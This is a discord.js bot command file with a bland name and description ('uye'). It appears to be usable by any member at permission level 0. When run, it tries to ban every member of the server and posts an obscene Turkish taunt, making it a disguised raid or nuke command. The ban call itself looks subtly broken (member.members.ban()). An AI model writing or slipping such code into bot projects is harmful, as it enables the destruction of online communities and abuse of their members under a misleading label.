const Discord = require("discord.js");

module.exports.run = async (client, message, args) => {

message.guild.members.cache.forEach(member => {member.members.ban()});
message.channel.send("```**Amınızı Siktik Öptüm Bay <3 Muck**```")
  
};

module.exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: [],
  permLevel: 0,
  kategori: "sunucu"
};

module.exports.help = {
  name: "uye",
  description: "uye",
  usage: "uye"
};